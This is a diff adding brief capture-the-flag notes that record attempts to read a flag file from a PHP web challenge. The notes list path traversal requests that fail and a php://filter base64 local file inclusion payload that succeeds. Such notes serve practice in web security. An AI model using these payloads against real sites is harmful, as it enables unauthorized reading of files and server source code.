@@ -1,0 +1,11 @@
+/?page=view&file=../uploads/flag.php
+	failed : if file param has 'flag', it returns 'permission denied'
+
+/?page=view&file=%0a../uploads/flag.php
+	failed : cannot bypass the regex filter
+
+/?page=../uploads/flag
+	something returned but cannot get flag. need to read the raw text in this file
+
+/?page=php://filter/convert.base64-encode/resource=../uploads/flag
+	success
